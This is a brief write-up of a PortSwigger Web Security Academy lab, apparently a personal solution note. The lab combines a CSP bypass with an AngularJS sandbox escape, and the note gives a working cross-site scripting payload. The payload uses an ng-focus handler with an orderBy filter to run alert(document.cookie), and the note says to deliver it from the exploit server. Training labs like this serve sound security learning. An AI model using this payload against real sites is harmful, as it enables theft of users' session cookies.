----

### Lab description


This lab uses [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) and [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection).

To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.


### Lab solution

- Add this payload ``` <script>
location='https://WEB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script> ```
at exploit server and click at `Deliver exploit to victim`

![](/static/img/Pasted_image_20230621084830.png)